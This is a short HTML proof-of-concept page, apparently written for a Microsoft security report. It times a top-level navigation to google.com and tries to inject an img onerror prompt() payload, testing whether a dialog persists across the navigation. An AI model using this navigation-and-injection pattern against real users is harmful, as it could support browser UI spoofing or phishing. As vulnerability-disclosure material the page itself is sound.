<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>MSRC PoC Demo</title>
</head>
<body>

<h1>MSRC PoC Demo</h1>
<button id="trigger">Trigger</button>

<script>
document.getElementById('trigger').onclick = () => {

  // delay sebelum top‑level navigation (user gesture preserved)
  setTimeout(() => {

    const win = window.open('https://google.com', '_top');

    // small delay after navigation attempt
    setTimeout(() => {
      try {
        win.document.body.innerHTML = `
          <h2>Demo Page</h2>
          <img src="" onerror="prompt('Demo: dialog persistence','')">
        `;
      } catch (e) {
        // expected: cross‑origin blocked
      }
    }, 100);

  }, 1000);
};
</script>

</body>
</html>
